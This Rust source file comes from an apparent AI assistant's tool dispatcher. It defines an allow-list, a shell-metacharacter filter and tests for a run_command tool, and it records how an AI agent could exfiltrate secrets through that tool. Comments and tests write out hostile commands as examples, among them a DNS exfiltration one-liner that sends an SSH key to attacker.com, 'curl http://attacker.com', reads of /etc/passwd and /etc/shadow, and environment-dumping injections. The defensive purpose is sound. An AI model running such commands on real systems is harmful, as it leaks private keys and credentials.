//! M1 tools registered into the dispatcher (koe-2gy + koe-s7i).
//!
//! koe-2gy ships `write_note` (a SAFE, path-free reference tool). koe-s7i adds
//! `web_search`, `read_file`, and `take_screenshot` here by extending
//! [`register_m1_tools`].
//!
//! The ALLOW_LIST for `run_command` lives in [`ALLOW_COMMANDS`] below. It is
//! checked AFTER the DENY_LIST in `tool_dispatcher.rs` and AFTER the DANGER human
//! gate — only commands matching an ALLOW entry can actually execute.

pub mod notes;
pub mod read_file;
pub mod take_screenshot;
pub mod web_search;

use std::sync::Arc;

use crate::storage::adapter::RecorderAdapter;
use crate::tool_dispatcher::ToolRegistry;

/// ALLOW_LIST for `run_command` (checked AFTER the DENY_LIST and the 30s human
/// gate). Only commands whose executable basename (case-insensitive, extension-
/// stripped on Windows) appears in this list can run. The dispatcher calls
/// [`command_is_allowed`] from `tool_dispatcher.rs` after `command_is_denied`
/// passes.
///
/// Design intent (CLAUDE.md): DENY_LIST is checked first (absolute hard blocks);
/// then for a `run_command` call that passed deny, the human gate fires (DANGER);
/// then if approved, ALLOW_LIST is the final allowlist. A command NOT in the
/// ALLOW_LIST is rejected even after human approval — belt-and-suspenders.
///
/// M1 scope: conservative set of read-only / informational commands only.
/// File-modifying or network-reaching commands are deliberately excluded so they
/// can be added intentionally in a future milestone with proper scoping.
///
/// # Security note: excluded commands
///
/// The following commands were explicitly removed from the allow-list because they
/// can exfiltrate secrets from the process environment or filesystem:
///
/// - `time` — a command wrapper/multiplexer: `time <cmd>` executes `<cmd>` and
///   measures its runtime. Because `command_is_allowed` checks only the FIRST
///   token, `"time cat /etc/passwd"` and `"time env"` would both pass the allow-
///   list check with "time" present (cat/env are not in the deny-list either).
///   Any exec wrapper that can prefix another command is forbidden regardless of
///   its own use. The same applies to `xargs`, `nice`, `nohup`, `timeout`,
///   `watch`, `env` (as launcher), `sudo`, `doas`, `exec`, `eval`, `command`,
///   `builtin` — none of these appear in the list.
/// - `env`, `set`, `printenv` — dump the FULL process environment, including
///   `BING_API_KEY` and any secret loaded via env vars. Even with the 30s human
///   approval gate, the human sees only "run run_command", not the argument, so
///   they cannot make an informed decision. The model can call `run_command {command:
///   'env'}` and receive all secrets in the tool output.
/// - `echo` — `echo $BING_API_KEY` works in any shell and exfiltrates key values.
/// - `cat`, `type`, `head`, `tail`, `more`, `less` — allow the model to read
///   arbitrary files if called with a path argument. Unlike `read_file`, these
///   commands bypass `validate_read_path` and the Documents/Desktop allowlist.
/// - `file` — reveals filesystem metadata and file types outside the allowlist.
/// - `ps`, `top`, `systeminfo` — expose full process list including process
///   arguments, which may contain in-memory secrets or API keys passed as argv.
/// - `ping`, `nslookup` — network-active commands that can be used for DNS
///   exfiltration (e.g. `ping $(cat ~/.ssh/id_rsa | base64).attacker.com`) or
///   covert channel data exfiltration even without shell metacharacters.
///
/// If environment inspection is ever needed, add a dedicated scoped tool that
/// returns only pre-approved, non-secret keys. File reading must go through
/// the `read_file` tool which enforces path validation and the allowlist.
pub const ALLOW_COMMANDS: &[&str] = &[
    // Directory listing / navigation
    "ls",
    "dir",
    "pwd",
    // Basic identity / host info (no process args, no network, no env dump)
    "whoami",
    "hostname",
    "uname",
    "date",
    // "time" is intentionally excluded: it is a command wrapper/multiplexer that
    // can prefix ANY other command (e.g. "time cat /etc/passwd", "time env").
    // command_is_allowed checks only the FIRST token, so "time <anything>" would
    // pass with "time" in the allow-list even if "<anything>" is disallowed.
    // Network interface listing (passive, no active network traffic)
    "ipconfig",
    "ifconfig",
    "netstat",
    // Windows task listing (task names only, generally no secrets in names)
    "tasklist",
    // Excluded (see Security note above):
    //   ps, top       — expose process argv (may contain in-memory secrets)
    //   systeminfo    — exposes detailed system config that aids further attacks
    //   ping          — active DNS/ICMP, DNS exfiltration vector
    //   traceroute, tracert — active network probing
    //   nslookup      — active DNS query, exfiltration vector
];

/// Shell metacharacters that are unconditionally rejected in a `run_command`
/// invocation. Any command string containing one of these characters is blocked
/// even if the leading executable is in [`ALLOW_COMMANDS`], because a compound
/// command like `ls && env` or `ls ; printenv` starts with an allowed program but
/// executes a disallowed one via the shell.
///
/// A legitimate `ls -la /path/to/dir` needs none of these characters.
///
/// Also includes `\n`, `\r`, `%`, and `^`:
/// - `\n` / `\r` — newline injection lets a multi-command sequence bypass the
///   first-token check: `"ls\nenv"` looks like token `"ls"` but shells execute
///   both lines.
/// - `%` — Windows CMD variable expansion (`%BING_API_KEY%`) exfiltrates secrets.
/// - `^` — Windows CMD escape character that can neutralise other filters.
const SHELL_METACHARACTERS: &[char] = &[
    '|', '&', ';', '<', '>', '`', '(', ')', '$', '\'', '"',
    '\n', '\r', // newline/CR injection bypass
    '%', '^',   // Windows CMD expansion and escape
];

/// Returns `true` if `args["command"]` is safe to run: the command contains no
/// shell metacharacters or control characters, has no path separator in the
/// executable token, AND its first executable token is in [`ALLOW_COMMANDS`]
/// (case-insensitive; on Windows only, a single known-safe extension is stripped).
///
/// Called by the dispatcher **after** `command_is_denied` returns `false` AND
/// after the DANGER human gate approves. A command not in the allow list, or one
/// that contains shell metacharacters, is rejected even with human approval
/// (CLAUDE.md: "DENY_LIST … を先に判定、その後 ALLOW_LIST ホワイトリスト").
///
/// # Metacharacter + control-character rejection
///
/// The entire command string is checked for [`SHELL_METACHARACTERS`] and any
/// other ASCII control characters BEFORE extracting the first token. This blocks:
/// - Compound commands: `ls && env`, `ls ; printenv`, `ls | cat /etc/passwd`
/// - Newline injection: `"ls\nenv"` — the `\n` is in the char list
/// - Windows CMD expansion: `%VAR%`, `^` escape
///
/// # Path-separator rejection in the executable token
///
/// A token like `/tmp/ls.evil` or `C:\x\ls.bat.sh` contains a path separator.
/// After `rsplit` extracts the basename, the stem would be `ls` — passing the
/// allow-list check while actually running a different binary. We reject any
/// token that contains a path separator (`/` or `\`) BEFORE the basename
/// extraction so that only bare command names (e.g. `ls`, `whoami`) are permitted.
///
/// # Extension handling
///
/// On Unix: extensions are NOT stripped. `ls.sh` ≠ `ls` and is rejected. The
/// allow-list names are bare stems; legitimate `ls` is called without an extension.
///
/// On Windows: exactly one extension is stripped for the well-known executable
/// suffixes (`.exe`, `.cmd`, `.bat`) to allow `ls.exe` → `ls`. Multi-extension
/// tricks like `ls.bat.sh` are rejected because only the final extension is
/// removed and `ls.bat` is not in the allow-list. Unknown suffixes (e.g. `.py`,
/// `.ps1`) are NOT stripped — they must match exactly (they won't, since the
/// allow-list has none of them, which is the correct outcome).
pub fn command_is_allowed(args: &serde_json::Value) -> bool {
    let cmd = args
        .get("command")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("");

    // Step 1: reject ANY shell metacharacter or ASCII control character in the
    // entire command string. This must run BEFORE token extraction so that
    // newline-injected multi-command strings are blocked at this stage.
    if cmd.chars().any(|c| SHELL_METACHARACTERS.contains(&c) || (c.is_ascii_control() && c != '\t' && c != ' ')) {
        return false;
    }

    // Step 2: extract the first whitespace-delimited token as the executable.
    let first_tok = cmd
        .split_whitespace()
        .next()
        .unwrap_or("");

    if first_tok.is_empty() {
        return false;
    }

    // Step 3: reject tokens that contain a path separator. A token like
    // `/tmp/ls.evil` or `C:\x\ls.bat.sh` would resolve to a different binary
    // than `ls`. Bare names (no `/` or `\`) are the only form we accept.
    //
    // Note: on Unix this also means an absolute path like `/usr/bin/ls` is
    // rejected — the model must use bare `ls`, not a full path. This is
    // intentional: full paths bypass PATH resolution and the allow-list is
    // defined in terms of command names, not filesystem paths.
    if first_tok.contains('/') || first_tok.contains('\\') {
        return false;
    }

    // Step 4: normalise the token for allow-list lookup.
    // On Windows strip a single known-safe executable extension; on Unix do NOT
    // strip extensions (ls.sh ≠ ls).
    #[cfg(windows)]
    let stem = {
        const WIN_EXTS: &[&str] = &[".exe", ".cmd", ".bat"];
        let lower = first_tok.to_ascii_lowercase();
        let stripped = WIN_EXTS
            .iter()
            .find_map(|ext| lower.strip_suffix(*ext))
            .unwrap_or(&lower)
            .to_string();
        stripped
    };
    #[cfg(not(windows))]
    let stem = first_tok.to_ascii_lowercase();

    ALLOW_COMMANDS.contains(&stem.as_str())
}

/// Registers every M1 tool (impl + `session.update` schema) into the dispatcher
/// registry. The single place where koe-s7i wires all tools.
///
/// Production calls this from `lib.rs` setup. The read_file allowlist and
/// screenshot save directory are resolved from the OS user directories here
/// (koe-351 seam: pass user-configurable paths once the settings UI lands).
pub fn register_m1_tools(registry: &mut ToolRegistry, recorder: Arc<dyn RecorderAdapter>) {
    // Resolve the search provider from the environment (None if none configured).
    // koe-8fw: provider selection — wire a real provider (+ Stronghold key,
    // koe-351) inside `configured_search_provider`.
    let search_provider = configured_search_provider();
    register_m1_tools_with_search(registry, recorder, search_provider);
}

/// Inner registration that takes the already-resolved search provider so tests
/// can inject a mock (or `None`) without touching process environment vars.
/// `register_m1_tools` is the production entry point; it resolves the provider
/// from the environment and forwards here.
fn register_m1_tools_with_search(
    registry: &mut ToolRegistry,
    recorder: Arc<dyn RecorderAdapter>,
    search_provider: Option<Arc<dyn web_search::SearchProvider>>,
) {
    // write_note — path-free safe note persistence via RecorderAdapter.
    registry.register(
        "write_note",
        notes::write_note_tool(recorder),
        notes::write_note_schema(),
    );

    // read_file — component-safe open (openat2/O_NOFOLLOW) within Documents+Desktop.
    let read_bases = read_file::default_read_allowlist();
    registry.register(
        "read_file",
        read_file::read_file_tool(read_bases),
        read_file::read_file_schema(),
    );

    // web_search — only registered when a working provider+key is actually
    // configured. Fail-closed: if no provider is configured we SKIP registration
    // entirely so the schema is never advertised to the model — otherwise the
    // model would call a dead tool that 404s/auth-errors at runtime (the Bing
    // Web Search v7 endpoint was retired 2025-08).
    if let Some(search_provider) = search_provider {
        registry.register(
            "web_search",
            web_search::web_search_tool(search_provider),
            web_search::web_search_schema(),
        );
    }

    // take_screenshot — xcap primary-monitor capture, saved to Documents.
    let screenshot_dir = take_screenshot::default_screenshot_dir();
    registry.register(
        "take_screenshot",
        take_screenshot::take_screenshot_tool(screenshot_dir),
        take_screenshot::take_screenshot_schema(),
    );
}

// ---------------------------------------------------------------------------
// configured_search_provider: the gate that decides whether web_search is
// advertised to the model at all.
// ---------------------------------------------------------------------------

/// Returns a configured [`web_search::SearchProvider`] **only if** a working
/// provider + key is available; otherwise `None`.
///
/// `register_m1_tools` calls this and registers `web_search` only when it
/// returns `Some(..)`. When it returns `None` the tool is NOT registered and
/// its schema is never advertised — so the model cannot call a dead tool
/// (fail-closed). This replaces the previous always-register-a-`NoKeyProvider`
/// behaviour, which advertised the tool and let the model invoke a backend that
/// could only ever return an error.
///
/// # Why this returns `None` unconditionally today (fail-closed until koe-8fw)
///
/// The only candidate provider is `BingProvider`, and its endpoint — the Bing
/// Web Search v7 API — was RETIRED 2025-08. Wiring `BingProvider::from_env()`
/// here would re-advertise a dead tool to the model whenever a `BING_API_KEY`
/// happens to be in the environment: the schema would appear, the model would
/// call it, and every call would 404 / auth-error at runtime. That is exactly
/// the dead-tool failure this gate exists to prevent.
///
/// Provider selection is deferred to **koe-8fw**. Until a working provider is
/// actually wired here, the SHIP path returns `None` unconditionally so
/// `web_search` is NEVER registered/advertised. The `SearchProvider` trait,
/// `BingProvider`, and its reqwest timeout + body-cap are intentionally KEPT in
/// the codebase (see `web_search.rs`) — koe-8fw will swap the endpoint and wire
/// the real provider in here. The unit tests inject a mock provider directly via
/// `register_m1_tools_with_search(.., Some(mock))`, so the registration path
/// stays covered without depending on this ship-path gate.
fn configured_search_provider() -> Option<Arc<dyn web_search::SearchProvider>> {
    // koe-8fw: return `Some(Arc::new(<real provider>))` once a working search
    // endpoint + key retrieval (koe-351 Stronghold) is wired. Returning `None`
    // here is the deliberate fail-closed default: no provider has a live
    // endpoint yet (Bing v7 retired 2025-08), so web_search stays unregistered.
    None
}

/// Process-wide lock that serialises the tests which mutate the `BING_API_KEY`
/// environment variable. Several tests in this module and in `web_search.rs`
/// set/remove that var; without serialisation they would race under cargo's
/// default parallel test runner and flake. All env-mutating tests acquire this
/// lock for their whole body. `pub(crate)` so `web_search.rs`'s test module can
/// share the same lock instance.
#[cfg(test)]
pub(crate) fn env_test_lock() -> &'static std::sync::Mutex<()> {
    static LOCK: std::sync::OnceLock<std::sync::Mutex<()>> = std::sync::OnceLock::new();
    LOCK.get_or_init(|| std::sync::Mutex::new(()))
}

// ---------------------------------------------------------------------------
// Tests: ALLOW_LIST + registration coverage
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // ---- command_is_allowed -------------------------------------------------

    #[test]
    fn allow_list_permits_approved_commands() {
        // Exact match.
        assert!(command_is_allowed(&serde_json::json!({"command": "ls -la"})));
        assert!(command_is_allowed(&serde_json::json!({"command": "whoami"})));
        // Case-insensitive.
        assert!(command_is_allowed(&serde_json::json!({"command": "LS /home"})));
        assert!(command_is_allowed(&serde_json::json!({"command": "DIR C:\\"})));
    }

    #[test]
    fn allow_list_rejects_unapproved_commands() {
        // rm is in the DENY_LIST but also not in ALLOW_LIST.
        assert!(!command_is_allowed(&serde_json::json!({"command": "rm -rf /"})));
        // python / node are NOT in ALLOW_LIST (intentional: general-purpose
        // interpreters need human gate but also not blanket-allowed).
        assert!(!command_is_allowed(&serde_json::json!({"command": "python script.py"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "node build.js"})));
        // Unknown / arbitrary.
        assert!(!command_is_allowed(&serde_json::json!({"command": "mymystery --flag"})));
        // Empty command.
        assert!(!command_is_allowed(&serde_json::json!({"command": ""})));
        assert!(!command_is_allowed(&serde_json::json!({})));
    }

    #[test]
    fn allow_list_rejects_secret_exfiltrating_commands() {
        // These commands were removed from ALLOW_LIST because they can exfiltrate
        // secrets (BING_API_KEY, env vars) or read arbitrary files bypassing
        // read_file's path validation and allowlist.
        //
        // env / set / printenv: dump the full process environment.
        assert!(!command_is_allowed(&serde_json::json!({"command": "env"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "set"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "printenv"})));
        // echo: `echo $BING_API_KEY` exfiltrates secrets.
        assert!(!command_is_allowed(&serde_json::json!({"command": "echo hello"})));
        // cat / type / head / tail / more / less / file: bypass read_file allowlist.
        assert!(!command_is_allowed(&serde_json::json!({"command": "cat /etc/passwd"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "type C:\\secrets.txt"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "head -n 10 /etc/shadow"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "tail -f /var/log/app.log"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "more /etc/hosts"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "less /etc/hosts"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "file /usr/bin/bash"})));
        // ps / top / systeminfo: expose process argv which may contain secrets.
        assert!(!command_is_allowed(&serde_json::json!({"command": "ps aux"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "top"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "systeminfo"})));
        // ping / nslookup: active network, DNS exfiltration vector.
        assert!(!command_is_allowed(&serde_json::json!({"command": "ping 8.8.8.8"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "nslookup example.com"})));
    }

    // ---- [P1-a] run_command: exec-wrapper / multiplexer commands are blocked ----
    //
    // "time" was previously in ALLOW_COMMANDS. Because command_is_allowed checks
    // only the FIRST token, "time cat /etc/passwd" and "time env" both passed
    // the allow-list check (cat/env are not in the deny-list). The fix removes
    // "time" and documents that ALL exec wrappers are forbidden for this reason.

    #[test]
    fn allow_list_rejects_time_exec_wrapper() {
        // "time" alone — removed from ALLOW_LIST.
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "time"})),
            "bare 'time' must be rejected (exec wrapper)"
        );
        // "time env" — would exfiltrate process environment.
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "time env"})),
            "'time env' must be rejected (exec wrapper + env dump)"
        );
        // "time cat /etc/passwd" — would read arbitrary file bypassing read_file.
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "time cat /etc/passwd"})),
            "'time cat /etc/passwd' must be rejected (exec wrapper + file read)"
        );
        // "time ls" — even a seemingly harmless combination must be blocked:
        // exec wrappers are categorically forbidden, not case-by-case.
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "time ls"})),
            "'time ls' must be rejected (exec wrapper, any prefixed command)"
        );
        // Other exec wrappers that could similarly bypass first-token check.
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "xargs ls"})),
            "'xargs' must be rejected (exec wrapper)"
        );
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "nice ls"})),
            "'nice' must be rejected (exec wrapper)"
        );
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "nohup ls"})),
            "'nohup' must be rejected (exec wrapper)"
        );
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "timeout 5 ls"})),
            "'timeout' must be rejected (exec wrapper)"
        );
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "watch ls"})),
            "'watch' must be rejected (exec wrapper)"
        );
    }

    #[test]
    fn allow_list_rejects_shell_metacharacters() {
        // A compound command that starts with an allowed executable but chains a
        // disallowed one via shell metacharacters must be rejected in full.
        // This prevents bypass attacks like `ls && env` or `ls ; printenv`.
        assert!(!command_is_allowed(&serde_json::json!({"command": "ls && env"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "ls ; printenv"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "ls | cat /etc/passwd"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "ls $(env)"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "ls `env`"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "ls > /tmp/out"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "ls < /etc/passwd"})));
        // Windows CMD injection characters.
        assert!(!command_is_allowed(&serde_json::json!({"command": "ls %BING_API_KEY%"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "ls ^& env"})));
        // Allowed commands without metacharacters still work.
        assert!(command_is_allowed(&serde_json::json!({"command": "ls -la /home/user"})));
        assert!(command_is_allowed(&serde_json::json!({"command": "whoami"})));
    }

    // ---- [P1] run_command: control-character injection bypass ----------------

    #[test]
    fn allow_list_rejects_newline_injection() {
        // `"ls\nenv"` — the first token is `ls` (allowed), but the `\n` injects a
        // second command line. Control chars must be caught BEFORE token extraction.
        let cmd_with_newline = "ls\nenv";
        assert!(
            !command_is_allowed(&serde_json::json!({"command": cmd_with_newline})),
            "newline injection must be rejected"
        );
        let cmd_with_cr = "ls\renv";
        assert!(
            !command_is_allowed(&serde_json::json!({"command": cmd_with_cr})),
            "carriage-return injection must be rejected"
        );
        // A plain NUL byte is also a control character.
        let cmd_with_nul = "ls\x00env";
        assert!(
            !command_is_allowed(&serde_json::json!({"command": cmd_with_nul})),
            "NUL byte injection must be rejected"
        );
        // BEL, BS, ESC are control chars too.
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "ls\x07"})),
            "BEL control char must be rejected"
        );
    }

    // ---- [P1] run_command: path-separator bypass in executable token ---------

    #[test]
    fn allow_list_rejects_path_separator_in_executable_token() {
        // `/tmp/ls.evil` — basename is `ls.evil`, stem is `ls` which is in
        // ALLOW_COMMANDS. The fix rejects any token containing a path separator.
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "/tmp/ls.evil -la"})),
            "/tmp/ls.evil must be rejected (path separator in executable token)"
        );
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "/usr/bin/ls -la"})),
            "absolute path must be rejected (path separator in token)"
        );
        // Windows path separator.
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "C:\\x\\ls.bat.sh"})),
            "Windows path with separator must be rejected"
        );
        // Relative path with leading ./
        assert!(
            !command_is_allowed(&serde_json::json!({"command": "./ls -la"})),
            "./ls must be rejected (contains path separator)"
        );
        // Bare name (no separator) still works.
        assert!(
            command_is_allowed(&serde_json::json!({"command": "ls -la"})),
            "bare ls must be permitted"
        );
    }

    // ---- [P1] run_command: extension handling (Unix no-strip / Windows strip) -

    #[test]
    fn allow_list_extension_handling() {
        // On Unix: ls.sh is NOT ls — must be rejected.
        // On Windows: ls.exe → ls (single known-safe extension stripped).
        // The test is OS-conditional because the stripping behaviour differs.

        // ls.sh: on ALL platforms this should be rejected because `.sh` is not a
        // known-safe Windows extension (and on Unix no stripping is done).
        #[cfg(not(windows))]
        {
            assert!(
                !command_is_allowed(&serde_json::json!({"command": "ls.sh -la"})),
                "ls.sh must be rejected on Unix (no extension stripping)"
            );
        }
        // Multi-extension trick: on Windows only the final known extension is
        // stripped. `ls.bat.sh` → final ext is `.sh` (not in WIN_EXTS) → stem is
        // `ls.bat` → NOT in ALLOW_COMMANDS → rejected.
        #[cfg(windows)]
        {
            assert!(
                !command_is_allowed(&serde_json::json!({"command": "ls.bat.sh -la"})),
                "ls.bat.sh must be rejected on Windows (multi-extension trick)"
            );
            // Single safe extension on Windows: ls.exe → ls.
            assert!(
                command_is_allowed(&serde_json::json!({"command": "ls.exe -la"})),
                "ls.exe must be allowed on Windows (single known extension)"
            );
        }
    }

    #[test]
    fn allow_list_rejects_multi_extension_tricks() {
        // On Unix (the build target): `ls.bat.sh` has NO extension stripping,
        // so the full token `ls.bat.sh` is compared against ALLOW_COMMANDS and
        // must be rejected. There are also NO path separators, so the path-
        // separator check passes, and this reaches the allow-list lookup.
        #[cfg(not(windows))]
        {
            assert!(
                !command_is_allowed(&serde_json::json!({"command": "ls.bat.sh -la"})),
                "ls.bat.sh must be rejected on Unix (no extension stripping, not in allow-list)"
            );
        }
    }

    // ---- shared test doubles ------------------------------------------------

    /// Minimal `RecorderAdapter` double for registration tests.
    struct NullRecorder;
    impl crate::storage::adapter::RecorderAdapter for NullRecorder {
        fn save_note(&self, _: &str) -> Result<i64, crate::storage::adapter::RecorderError> { Ok(0) }
        fn list_recent_notes(&self, _: u32) -> Result<Vec<crate::storage::adapter::Note>, crate::storage::adapter::RecorderError> { Ok(vec![]) }
        fn log_conversation_event(&self, _: &str, _: &str, _: &str) -> Result<i64, crate::storage::adapter::RecorderError> { Ok(0) }
        fn list_recent_events(&self, _: u32) -> Result<Vec<crate::storage::adapter::ConversationEvent>, crate::storage::adapter::RecorderError> { Ok(vec![]) }
        fn add_month_cost(&self, _: u32, n: u64) -> Result<u64, crate::storage::adapter::RecorderError> { Ok(n) }
        fn load_cost_snapshot(&self, _: u32) -> Result<Option<u64>, crate::storage::adapter::RecorderError> { Ok(None) }
        fn health_check(&self) -> Result<(), crate::storage::adapter::RecorderError> { Ok(()) }
    }

    /// A `SearchProvider` double that simulates a configured/working provider.
    /// Used to prove that web_search IS registered when a provider is present.
    struct MockSearchProvider;
    impl web_search::SearchProvider for MockSearchProvider {
        fn search(
            &self,
            _query: &str,
        ) -> crate::realtime_types::BoxFuture<'static, Result<Vec<web_search::SearchResult>, String>>
        {
            Box::pin(async move { Ok(vec![]) })
        }
    }

    fn registered_names(registry: &ToolRegistry) -> std::collections::HashSet<String> {
        registry
            .tool_schemas()
            .iter()
            .map(|s| s.name.clone())
            .collect()
    }

    // ---- dispatcher registration: core tools always registered --------------

    #[test]
    fn core_tools_have_correct_schema_names() {
        // With NO configured search provider, the three always-on tools register
        // and web_search does NOT (see web_search-specific tests below).
        let mut registry = ToolRegistry::new();
        register_m1_tools_with_search(&mut registry, Arc::new(NullRecorder), None);
        let names = registered_names(&registry);
        assert!(names.contains("write_note"), "write_note must be registered");
        assert!(names.contains("read_file"), "read_file must be registered");
        assert!(names.contains("take_screenshot"), "take_screenshot must be registered");
        assert_eq!(
            registry.tool_schemas().len(),
            3,
            "exactly 3 tools (no web_search) must be registered when no provider is configured"
        );
    }

    // ---- [P1-2] web_search NOT advertised when no provider is configured -----
    //
    // Fail-closed: with no working provider+key, web_search's schema must NOT be
    // in the registry — otherwise the model would call a dead tool (the Bing v7
    // endpoint was retired 2025-08).

    #[test]
    fn web_search_not_registered_without_configured_provider() {
        let mut registry = ToolRegistry::new();
        register_m1_tools_with_search(&mut registry, Arc::new(NullRecorder), None);
        let names = registered_names(&registry);
        assert!(
            !names.contains("web_search"),
            "web_search must NOT be advertised when no provider is configured (dead tool)"
        );
        // Sanity: the other tools are still present.
        assert!(names.contains("write_note"));
        assert!(names.contains("read_file"));
        assert!(names.contains("take_screenshot"));
    }

    // ---- [P1-2] SHIP path: web_search NOT registered even with BING_API_KEY --
    //
    // The retired Bing v7 endpoint must never be re-advertised. The ship path
    // (`register_m1_tools` → `configured_search_provider`) returns `None`
    // unconditionally until koe-8fw wires a working provider — so even if a
    // `BING_API_KEY` is present in the process environment, web_search must NOT
    // be registered (otherwise the model calls a dead tool that 404s/auth-errors).
    //
    // NOTE: `configured_search_provider()` ignores the env entirely now, so this
    // assertion holds regardless of cross-test env leakage; we set the var only
    // to make the "even with a key present" intent explicit.

    #[test]
    fn configured_search_provider_returns_none_on_ship_path() {
        // The ship-path resolver returns None unconditionally (fail-closed until
        // koe-8fw). Set BING_API_KEY to prove the env no longer flips this.
        // Serialise against other env-mutating tests to avoid a race.
        let _guard = env_test_lock().lock().unwrap_or_else(|e| e.into_inner());
        let prev = std::env::var("BING_API_KEY").ok();
        // SAFETY: test-only env mutation, serialised by env_test_lock; restored
        // below. `configured_search_provider` does not read the env, so this only
        // documents intent ("even with a key present").
        unsafe { std::env::set_var("BING_API_KEY", "fake-key-ship-path-test"); }
        assert!(
            configured_search_provider().is_none(),
            "ship path must return None even with BING_API_KEY set (dead Bing v7 endpoint)"
        );
        // Restore prior env state so we do not affect other tests.
        unsafe {
            match prev {
                Some(v) => std::env::set_var("BING_API_KEY", v),
                None => std::env::remove_var("BING_API_KEY"),
            }
        }
    }

    #[test]
    fn ship_path_does_not_register_web_search_even_with_key() {
        // Full ship-path integration: register_m1_tools resolves the provider via
        // configured_search_provider() (which returns None), so web_search must
        // be absent from the registry even when BING_API_KEY is present.
        // Serialise against other env-mutating tests to avoid a race.
        let _guard = env_test_lock().lock().unwrap_or_else(|e| e.into_inner());
        let prev = std::env::var("BING_API_KEY").ok();
        // SAFETY: test-only env mutation, serialised by env_test_lock; restored below.
        unsafe { std::env::set_var("BING_API_KEY", "fake-key-ship-path-test"); }

        let mut registry = ToolRegistry::new();
        register_m1_tools(&mut registry, Arc::new(NullRecorder));
        let names = registered_names(&registry);

        unsafe {
            match prev {
                Some(v) => std::env::set_var("BING_API_KEY", v),
                None => std::env::remove_var("BING_API_KEY"),
            }
        }

        assert!(
            !names.contains("web_search"),
            "ship path must NOT advertise web_search even with BING_API_KEY set (retired Bing v7)"
        );
        // The three always-on tools are still registered.
        assert!(names.contains("write_note"));
        assert!(names.contains("read_file"));
        assert!(names.contains("take_screenshot"));
        assert_eq!(
            registry.tool_schemas().len(),
            3,
            "exactly 3 tools (no web_search) on the ship path"
        );
    }

    // ---- [P1-2] web_search IS advertised when a provider IS configured -------

    #[test]
    fn web_search_registered_with_configured_provider() {
        let provider: Arc<dyn web_search::SearchProvider> = Arc::new(MockSearchProvider);
        let mut registry = ToolRegistry::new();
        register_m1_tools_with_search(&mut registry, Arc::new(NullRecorder), Some(provider));
        let names = registered_names(&registry);
        assert!(
            names.contains("web_search"),
            "web_search must be advertised when a working provider is configured"
        );
        assert_eq!(
            registry.tool_schemas().len(),
            4,
            "all 4 tools must be registered when a search provider is configured"
        );
    }

    // ---- dispatcher routing: new tools classify correctly as SAFE -----------

    #[test]
    fn new_tools_classify_as_safe() {
        use crate::approval_gate::{classify, ApprovalRisk};
        for name in ["read_file", "web_search", "take_screenshot"] {
            assert_eq!(
                classify(name),
                ApprovalRisk::Safe,
                "{name} should classify as SAFE"
            );
        }
    }

    // ---- run_command ALLOW_LIST integration with dispatcher -----------------

    #[test]
    fn run_command_not_in_allow_list_is_blocked() {
        // A command that passes the DENY_LIST and the human gate but is NOT in
        // ALLOW_LIST should be blocked. We test this by verifying command_is_allowed
        // returns false for commands not in the list.
        // The enforcement in the dispatcher is step 5.5 (dispatch_impl in
        // tool_dispatcher.rs): after the deny-list check (step 3) and after the
        // 30s human gate (step 5), `command_is_allowed` is the final allow-list.
        assert!(!command_is_allowed(&serde_json::json!({"command": "python malicious.py"})));
        assert!(!command_is_allowed(&serde_json::json!({"command": "node exfiltrate.js"})));
        // curl is in the DENY_LIST AND not in ALLOW_LIST — double-blocked.
        assert!(!command_is_allowed(&serde_json::json!({"command": "curl http://attacker.com"})));
        // ping is removed from ALLOW_LIST (DNS exfiltration risk).
        assert!(!command_is_allowed(&serde_json::json!({"command": "ping 8.8.8.8"})));
        // Allowed commands are permitted by the ALLOW_LIST.
        assert!(command_is_allowed(&serde_json::json!({"command": "ls -la"})));
        assert!(command_is_allowed(&serde_json::json!({"command": "whoami"})));
    }
}
